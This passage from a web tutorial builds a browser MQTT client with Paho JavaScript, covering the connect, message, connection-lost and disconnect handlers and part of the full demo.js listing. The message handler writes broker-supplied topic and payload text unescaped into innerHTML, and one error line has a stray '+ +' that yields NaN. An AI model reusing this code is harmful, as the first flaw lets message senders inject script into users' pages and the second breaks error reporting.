    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;span&gt;Connecting to: &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; host &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos; on port: &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; port &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;span&gt;Using the following client value: &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; clientID &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// Initialize new Paho client connection&lt;/span&gt;
    client &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Paho&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;MQTT&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Client&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;host&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;Number&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;port&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; clientID&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// Set callback handlers&lt;/span&gt;
    client&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;onConnectionLost &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; onConnectionLost&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    client&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;onMessageArrived &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; onMessageArrived&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    client&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; 
        onSuccess&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; onConnect&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        onFailure&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;span&gt;ERROR: Connection to: &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; host &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos; on port: &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; port &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos; failed.&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;js-writing-the-onconnectionlost-function&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#js-writing-the-onconnectionlost-function&quot; aria-label=&quot;js writing the onconnectionlost function permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;JS: Writing the &lt;code class=&quot;language-text&quot;&gt;onConnectionLost&lt;/code&gt; function&lt;/h4&gt;
&lt;p&gt;When writing the &lt;code class=&quot;language-text&quot;&gt;startConnect&lt;/code&gt; function, we specified two callback functions. The first was the &lt;code class=&quot;language-text&quot;&gt;onConnectionLost&lt;/code&gt; function. This code is specified so that in the event of a lost connection an event can be specified. Similar to the previous code, we are going to put in some code that will display an error message in the &lt;em&gt;messages&lt;/em&gt; div. In the scenario where the exit code from the connection is not &lt;code class=&quot;language-text&quot;&gt;0&lt;/code&gt;, we will also print the error the &lt;em&gt;messages&lt;/em&gt; div.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;js&quot;&gt;&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Called when the client loses its connection&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;onConnectionLost&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;responseObject&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;span&gt;ERROR: Connection lost&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;responseObject&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;errorCode &lt;span class=&quot;token operator&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;span&gt;ERROR: &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; responseObject&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;errorMessage &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;js-writing-the-onmessagearrived-function&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#js-writing-the-onmessagearrived-function&quot; aria-label=&quot;js writing the onmessagearrived function permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;JS: Writing the &lt;code class=&quot;language-text&quot;&gt;onMessageArrived&lt;/code&gt; function&lt;/h4&gt;
&lt;p&gt;When writing the &lt;code class=&quot;language-text&quot;&gt;startConnect&lt;/code&gt; function, we specified two callback functions. The second was the &lt;code class=&quot;language-text&quot;&gt;onMessageArrived&lt;/code&gt; function. This code is very important! This function is called every time that a message is received from the MQTT broker. Similar to the previous code, we are going to put in some code that will display the message in the &lt;em&gt;messages&lt;/em&gt; div. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;js&quot;&gt;&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Called when a message arrives&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;onMessageArrived&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;span&gt;Topic: &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; message&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;destinationName &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;  | &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; message&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;payloadString &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;js-writing-the-startdisconnect-function&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#js-writing-the-startdisconnect-function&quot; aria-label=&quot;js writing the startdisconnect function permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;JS: Writing the &lt;code class=&quot;language-text&quot;&gt;startDisconnect&lt;/code&gt; function&lt;/h4&gt;
&lt;p&gt;This is the final JavaScript function we require. When we made our HTML form we specified a button that would disconnect from the MQTT subscription. We can simply call the &lt;code class=&quot;language-text&quot;&gt;disconnect&lt;/code&gt; method on the &lt;code class=&quot;language-text&quot;&gt;client&lt;/code&gt; and the MQTT connection will be closed. We will also print out a message in the &lt;em&gt;messages&lt;/em&gt; div to inform the user.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;js&quot;&gt;&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Called when the disconnection button is pressed&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;startDisconnect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    client&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;disconnect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;span&gt;Disconnected&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;updateScroll&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// Scroll to bottom of window&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;js-final-javascript-code&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#js-final-javascript-code&quot; aria-label=&quot;js final javascript code permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;JS: Final JavaScript code&lt;/h4&gt;
&lt;p&gt;The entire JavaScript code in the &lt;code class=&quot;language-text&quot;&gt;demo.js&lt;/code&gt; file we have made so far is documented below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;js&quot;&gt;&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Called after form input is processed&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;startConnect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// Generate a random client ID&lt;/span&gt;
    clientID &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;clientID-&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Math&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// Fetch the hostname/IP address and port number from the form&lt;/span&gt;
    host &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;host&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;value&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    port &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;port&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;value&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// Print output for the user in the messages div&lt;/span&gt;
    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;span&gt;Connecting to: &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; host &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos; on port: &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; port &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;span&gt;Using the following client value: &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; clientID &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// Initialize new Paho client connection&lt;/span&gt;
    client &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Paho&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;MQTT&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Client&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;host&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;Number&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;port&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; clientID&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// Set callback handlers&lt;/span&gt;
    client&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;onConnectionLost &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; onConnectionLost&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    client&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;onMessageArrived &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; onMessageArrived&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// Connect the client, if successful, call onConnect function&lt;/span&gt;
    client&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; 
        onSuccess&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; onConnect&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Called when the client connects&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;onConnect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// Fetch the MQTT topic from the form&lt;/span&gt;
    topic &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;topic&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;value&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// Print output for the user in the messages div&lt;/span&gt;
    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;span&gt;Subscribing to: &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; topic &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// Subscribe to the requested topic&lt;/span&gt;
